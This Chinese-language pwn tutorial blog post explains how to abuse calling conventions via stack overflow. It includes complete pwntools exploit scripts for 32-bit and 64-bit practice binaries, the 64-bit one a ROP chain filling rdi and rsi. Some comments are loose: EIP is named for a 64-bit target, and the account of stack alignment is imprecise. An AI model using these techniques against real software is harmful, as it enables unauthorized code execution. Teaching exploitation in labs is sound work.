---
title: 攻击调用约定
subtitle: 利用调用约定
date: 2023-08-11T15:31:21+08:00
draft: false
author:
  name: CuB3y0nd
  link:
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - PWN
  - Stack
categories:
  - PWN
hiddenFromHomePage: false
hiddenFromSearch: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: false
math: false
lightgallery: true
password:
message:
repost:
  enable: false
  url:
---

<!--more-->

{{< link href="/pwn_assets/exploiting_with_params.zip" content="exploiting_with_params.zip" title="Download exploiting_with_params.zip" download="exploiting_with_params.zip" card=true >}}

## 0x01 32-bit

程序期望在执行函数之前栈是这样的布局：

<div align=center>
  <image src="https://s1.ax1x.com/2023/08/11/pPn3RoV.png"/>
</div>

那么我们为什么不这样提供呢？除了函数之外，我们还传递返回地址和参数：

<div align=center>
  <image src="https://s1.ax1x.com/2023/08/11/pPn3hJU.png"/>
</div>

`flag()` 地址之后的所有内容都将成为下一个函数的栈帧的一部分，因为它 **预期** 在那里
——只是我们没有使用 `push` 指令，而是手动覆盖它们。

```python {title="exp.py"}
from pwn import *

context(os='linux', arch='amd64', log_level='info')

p = process('./vuln-32')

# Padding 到 EIP
payload = b'A' * 52
# flag() 的地址
payload += p32(0x080491c7)
# 避免异常
payload += p32(0x0)
# 第一个参数
payload += p32(0xdeadc0de)
# 第二个参数
payload += p32(0xc0ded00d)

p.sendline(payload)

p.interactive()
```

## 0x02 64-bit

相同的逻辑，只不过我们必须利用之前讨论过的 gadgets 来填充所需的寄存器（在本例中为
`rdi` 和 `rsi` ，因为我们有两个参数）。

我们必须在 *调用函数之前* 填充寄存器：

```python {title="exp.py"}
from pwn import *

context(os='linux', arch='amd64', log_level='info')

p = process('./vuln-64')

POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9

# Padding 到 EIP
payload = b'A' * 56
# pop rdi ; ret
payload += p64(POP_RDI)
# 进入 rdi 的值 - 第一个参数
payload += p64(0xdeadc0de)
# pop rsi ; pop r15 ; ret
payload += p64(POP_RSI_R15)
# 进入 rsi 的值 - 第二个参数
payload += p64(0xc0ded00d)
# 进入 r15 的值 - 避免异常
payload += p64(0x0)
# flag() 的地址
payload += p64(0x40116f)
# 避免异常
payload += p64(0x0)

p.sendline(payload)

p.interactive()
```

{{<admonition type="info">}}

在返回地址后面加 0 本质是为了让程序有个返回的地方，防止异常，不然会返回到下面
奇奇怪怪的东西；有时候也可能是栈对齐，64-bit 程序执行 `system` 时会有一个检查，
确保栈指针是指着 0 的（结尾是 0），没有对齐的话就不能执行。

通常 0 可以替换为任意值，效果是一样的。只是习惯加 0。

{{</admonition>}}

